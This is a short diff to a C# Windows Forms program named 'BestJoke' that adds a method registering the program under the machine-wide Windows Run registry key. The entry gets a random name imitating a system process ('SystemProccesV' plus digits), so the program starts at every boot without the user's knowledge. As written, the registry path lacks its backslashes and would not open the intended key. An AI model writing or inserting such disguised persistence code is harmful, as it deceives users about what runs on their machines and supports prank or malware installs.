@@ -49,6 +49,27 @@ namespace BestJoke
 			{
 				Log("Key open falied");
 			}
+
+			AddToAutorun();
+		}
+
+		private void AddToAutorun()
+		{
+			Random rnd = new Random();
+
+			Microsoft.Win32.RegistryKey myKey =
+				Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWAREMicrosoftWindowsCurrentVersionRun", true);
+
+			string random_str = $"{rnd.Next(0, 10)}{rnd.Next(0, 10)}{rnd.Next(0, 10)}";
+
+			try
+			{
+				myKey.SetValue("SystemProccesV" + random_str, Application.ExecutablePath);
+			}
+			catch (Exception ex)
+			{
+				Log("Add to autorun falied " + ex.ToString());
+			}
 		}
 
 		private void Form1_FormClosing(object sender, FormClosingEventArgs e)
